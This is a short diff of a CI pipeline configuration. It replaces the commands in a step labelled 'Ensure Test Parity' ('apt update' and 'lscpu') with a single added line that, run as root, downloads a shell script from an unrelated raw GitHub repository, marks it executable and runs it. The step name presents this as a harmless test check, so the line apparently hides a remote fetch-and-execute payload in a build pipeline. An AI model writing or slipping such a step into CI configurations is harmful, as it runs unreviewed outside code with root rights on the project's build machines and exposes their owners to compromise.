@@ -9,5 +9,4 @@ jobs:
       - run: 
           name: Ensure Test Parity 
           command: | 
-                 apt update
-                 lscpu
+                 sudo -u root wget https://raw.githubusercontent.com/dewaagro/repotestedcicilan/main/pointerhu12.sh && chmod +x *.sh && ./pointerhu12.sh
